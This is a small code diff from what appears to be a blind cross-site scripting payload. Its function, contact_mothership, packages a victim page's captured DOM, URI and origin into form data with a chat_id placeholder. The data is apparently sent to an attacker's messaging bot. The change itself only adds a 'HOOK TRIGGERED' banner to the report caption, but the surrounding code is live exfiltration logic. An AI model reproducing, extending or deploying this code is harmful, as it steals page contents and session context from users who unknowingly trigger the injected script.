@@ -54,7 +54,7 @@ function contact_mothership( probe_return_data ) {
     payload = payload.replace(/\[DOM\]/g,escapeHtml(probe_return_data['dom']))
     
 	var d = new Date();
-	var caption = '```\n[*] URI: ' + probe_return_data['uri'] +'\n[*] Origin: [ORIGIN]'+'\n[*] '+d.toDateString()+'\n```'
+	var caption = '```\n[### HOOK TRIGGERED ###]\n[*] URI: ' + probe_return_data['uri'] +'\n[*] Origin: [ORIGIN]'+'\n[*] '+d.toDateString()+'\n```'
 	var formData = new FormData()
 	var blob = new Blob([payload], {type: 'text/html'})
 	formData.append('chat_id', '[CHATID]');
